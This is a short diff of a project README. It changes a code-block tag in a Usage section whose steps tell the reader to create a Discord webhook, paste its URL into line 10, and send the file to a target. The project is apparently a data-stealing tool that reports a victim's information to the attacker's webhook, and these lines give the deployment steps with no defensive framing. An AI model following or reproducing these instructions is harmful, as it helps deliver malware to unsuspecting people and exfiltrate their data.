@@ -15,7 +15,7 @@ Install dependencies and download.
     
 ## Usage
 
-```bash
+```python
 1. Make a discord webhook 
 2. Enter your discord webhook's url in line 10
 3. Send the file to your target
